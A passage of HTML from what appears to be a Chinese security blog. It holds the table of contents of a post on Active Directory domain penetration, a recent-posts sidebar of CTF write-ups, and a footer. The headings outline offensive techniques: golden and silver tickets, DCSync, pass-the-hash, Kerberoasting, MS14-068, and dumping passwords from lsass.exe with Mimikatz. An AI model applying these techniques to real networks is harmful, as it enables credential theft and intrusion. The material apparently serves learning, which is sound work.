class="toc-number">1.2.2.</span> <span class="toc-text">LLMNR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mDNS"><span class="toc-number">1.2.3.</span> <span class="toc-text">mDNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WPAD"><span class="toc-number">1.2.4.</span> <span class="toc-text">WPAD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-number">1.3.</span> <span class="toc-text">域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.1.</span> <span class="toc-text">域结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB"><span class="toc-number">1.3.3.</span> <span class="toc-text">信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OU"><span class="toc-number">1.3.4.</span> <span class="toc-text">OU</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory"><span class="toc-number">1.4.</span> <span class="toc-text">Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ADDS"><span class="toc-number">1.4.1.</span> <span class="toc-text">ADDS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E7%A7%B0%E7%A9%BA%E9%97%B4"><span class="toc-number">1.4.2.</span> <span class="toc-text">名称空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%B1%9E%E6%80%A7"><span class="toc-number">1.4.3.</span> <span class="toc-text">对象与属性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS"><span class="toc-number">1.5.</span> <span class="toc-text">ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6"><span class="toc-number">1.5.1.</span> <span class="toc-text">证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.5.2.</span> <span class="toc-text">证书模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%B3%A8%E5%86%8C"><span class="toc-number">1.5.3.</span> <span class="toc-text">证书注册</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5-1"><span class="toc-number">1.6.</span> <span class="toc-text">组策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.6.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%A6%82%E5%BF%B5"><span class="toc-number">1.6.2.</span> <span class="toc-text">常用概念</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E7%9A%84Windows%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.7.</span> <span class="toc-text">Kerberos的Windows实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN"><span class="toc-number">1.7.1.</span> <span class="toc-text">SPN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">1.8.</span> <span class="toc-text">域内攻击思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.9.</span> <span class="toc-text">攻击类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">1.9.1.</span> <span class="toc-text">黄金票据利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">1.9.2.</span> <span class="toc-text">白银票据利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync-%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.3.</span> <span class="toc-text">DCSync 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCShadow-%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.4.</span> <span class="toc-text">DCShadow 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.5.</span> <span class="toc-text">哈希传递攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.6.</span> <span class="toc-text">票据传递攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting-Attacks"><span class="toc-number">1.9.7.</span> <span class="toc-text">Kerberoasting Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Roasting-AS-REP"><span class="toc-number">1.9.7.1.</span> <span class="toc-text">Roasting AS-REP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Delegation-Attacks"><span class="toc-number">1.9.8.</span> <span class="toc-text">Kerberos Delegation Attacks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.9.9.</span> <span class="toc-text">其他漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.</span> <span class="toc-text">域渗透实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.1.</span> <span class="toc-text">确定环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.2.</span> <span class="toc-text">域内信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#net-view"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">net view</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#net-view-domain"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">net view &#x2F;domain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#net-user-domain"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">net user &#x2F;domain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#net-group-domain"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">net group &#x2F;domain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#whoami-user"><span class="toc-number">2.1.2.5.</span> <span class="toc-text">whoami &#x2F;user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#net-group-%E2%80%9Cdomain-controllers%E2%80%9D-domain"><span class="toc-number">2.1.2.6.</span> <span class="toc-text">net group “domain controllers” &#x2F;domain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#systeminfo-findstr-%E2%80%9CKB%E2%80%9D"><span class="toc-number">2.1.2.7.</span> <span class="toc-text">systeminfo | findstr “KB”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-number">2.1.2.8.</span> <span class="toc-text">定位域控</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">本地认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">Windows本地认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-hash"><span class="toc-number">2.2.2.</span> <span class="toc-text">NTLM hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">加密过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E7%9A%84%E5%AF%86%E7%A0%81%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">存储的密码格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lsass-exe"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">lsass.exe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-lsass-exe-%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">2.3.</span> <span class="toc-text">从 lsass.exe 获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Procdump"><span class="toc-number">2.3.1.</span> <span class="toc-text">Procdump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz"><span class="toc-number">2.3.2.</span> <span class="toc-text">Mimikatz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH%EF%BC%88pass-the-hash%EF%BC%89%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">2.4.</span> <span class="toc-text">PTH（pass-the-hash）哈希传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.4.2.</span> <span class="toc-text">基本条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.4.3.</span> <span class="toc-text">适用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">2.4.4.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="toc-number">2.4.5.</span> <span class="toc-text">发起攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.5.</span> <span class="toc-text">Kerberos认证协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTC%EF%BC%88pass-the-ccahe%EF%BC%89%E7%BC%93%E5%AD%98%E4%BC%A0%E9%80%92"><span class="toc-number">2.6.</span> <span class="toc-text">PTC（pass-the-ccahe）缓存传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.1.</span> <span class="toc-text">MS14-068漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">2.6.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.6.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTT%EF%BC%88pass-the-ticket%EF%BC%89%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.7.</span> <span class="toc-text">PTT（pass-the-ticket）黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-2"><span class="toc-number">2.7.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">2.7.2.</span> <span class="toc-text">基本条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="toc-number">2.7.3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.7.4.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/08/HNCTF2025/" title="HNCTF2025">HNCTF2025</a><time datetime="2025-06-08T15:37:49.000Z" title="发表于 2025-06-08 23:37:49">2025-06-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/04/D3CTF2025/" title="D3CTF2025">D3CTF2025</a><time datetime="2025-06-04T06:10:33.000Z" title="发表于 2025-06-04 14:10:33">2025-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/28/nssctf-pwn%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="nssctf-pwn入门题单">nssctf-pwn入门题单</a><time datetime="2025-05-28T01:35:03.000Z" title="发表于 2025-05-28 09:35:03">2025-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/26/LitCTF2025/" title="LitCTF2025">LitCTF2025</a><time datetime="2025-05-26T08:13:36.000Z" title="发表于 2025-05-26 16:13:36">2025-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化">python反序列化</a><time datetime="2025-05-08T06:37:06.000Z" title="发表于 2025-05-08 14:37:06">2025-05-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
